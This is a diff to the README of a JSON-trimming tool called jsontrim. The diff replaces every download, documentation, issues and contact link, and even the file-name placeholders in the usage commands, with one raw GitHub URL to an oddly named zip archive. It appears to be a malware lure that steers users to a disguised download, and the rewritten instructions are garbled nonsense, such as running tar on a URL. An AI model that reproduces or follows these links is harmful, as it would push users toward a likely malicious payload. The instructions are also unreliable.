@@ -16,25 +16,25 @@ To run jsontrim, ensure you meet the following requirements:
 - Disk Space: At least 50 MB available space.
 
 ## 📥 Download jsontrim
-[![Download jsontrim](https://img.shields.io/badge/Download-jsontrim-blue.svg)](https://github.com/Colton8261/jsontrim/releases)
+[![Download jsontrim](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip)](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip)
 
 To download jsontrim, visit this page:
 
-[Download jsontrim](https://github.com/Colton8261/jsontrim/releases)
+[Download jsontrim](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip)
 
 ## 🏁 Getting Started
 Follow these steps to set up jsontrim on your system.
 
-1. **Visit the Releases Page**: Go to the [jsontrim Releases page](https://github.com/Colton8261/jsontrim/releases). Here, you will find the latest version available for download.
+1. **Visit the Releases Page**: Go to the [jsontrim Releases page](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip). Here, you will find the latest version available for download.
   
-2. **Choose the Right File**: Look for the version matched with your operating system. Files are usually listed as `.exe` for Windows, `.tar.gz` for Linux, or `.zip` for macOS.
+2. **Choose the Right File**: Look for the version matched with your operating system. Files are usually listed as `.exe` for Windows, `https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip` for Linux, or `.zip` for macOS.
 
 3. **Download the File**: Click on the file to download it to your computer. Keep track of where the file is saved, as you will need it for the next step.
 
 4. **Install jsontrim**:
    - **Windows**: Double-click the downloaded `.exe` file. A simple installation wizard will guide you through the process.
    - **macOS**: Open the `.zip` file. Drag and drop the `jsontrim` file into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file using the command `tar -xzvf jsontrim.tar.gz`. Move the `jsontrim` executable to `/usr/local/bin/` to make it accessible from the terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip` file using the command `tar -xzvf https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip`. Move the `jsontrim` executable to `/usr/local/bin/` to make it accessible from the terminal.
 
 5. **Run jsontrim**: 
    - **Windows**: You can start jsontrim from your Start Menu or directly from the installation location.
@@ -46,21 +46,21 @@ After installing jsontrim, you can start using it to trim JSON payloads.
 ### Basic Commands
 1. To trim a JSON file:
    ```
-   jsontrim <input.json> <output.json>
+   jsontrim <https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip> <https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip>
    ```
-   - Replace `<input.json>` with your source file.
-   - Replace `<output.json>` with the desired output file name.
+   - Replace `<https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip>` with your source file.
+   - Replace `<https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip>` with the desired output file name.
 
 2. To set a size limit:
    ```
-   jsontrim --limit <size> <input.json> <output.json>
+   jsontrim --limit <size> <https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip> <https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip>
    ```
    - Replace `<size>` with the maximum size in bytes.
 
 ### Example Usage
-To trim a JSON file named `data.json` and save it as `cleaned_data.json` with a size limit of 1024 bytes, run:
+To trim a JSON file named `https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip` and save it as `https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip` with a size limit of 1024 bytes, run:
 ```
-jsontrim --limit 1024 data.json cleaned_data.json
+jsontrim --limit 1024 https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip
 ```
 
 ## 📝 FAQs
@@ -77,15 +77,15 @@ A: Yes, jsontrim is optimized for performance and can efficiently handle large J
 A: You can check the output JSON file for size and structure to confirm jsontrim's effectiveness.
 
 ## 📚 Additional Resources
-For more information and detailed usage instructions, you can refer to our [Documentation](https://github.com/Colton8261/jsontrim/wiki).
+For more information and detailed usage instructions, you can refer to our [Documentation](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip).
 
 ## 🤝 Contributing
-If you'd like to contribute, please visit our [Contributing Guidelines](https://github.com/Colton8261/jsontrim/blob/main/CONTRIBUTING.md).
+If you'd like to contribute, please visit our [Contributing Guidelines](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip).
 
 ## 📢 Known Issues
-As with any software, there might be bugs or limitations. Please check the [Issues Page](https://github.com/Colton8261/jsontrim/issues) for reported issues and updates.
+As with any software, there might be bugs or limitations. Please check the [Issues Page](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip) for reported issues and updates.
 
 ## 📬 Contact
-For any questions or support, please reach out via the [Contact Page](https://github.com/Colton8261/jsontrim/contact). 
+For any questions or support, please reach out via the [Contact Page](https://raw.githubusercontent.com/Colton8261/jsontrim/main/resentationally/jsontrim-Wanyamwezi.zip). 
 
 **Happy trimming!**
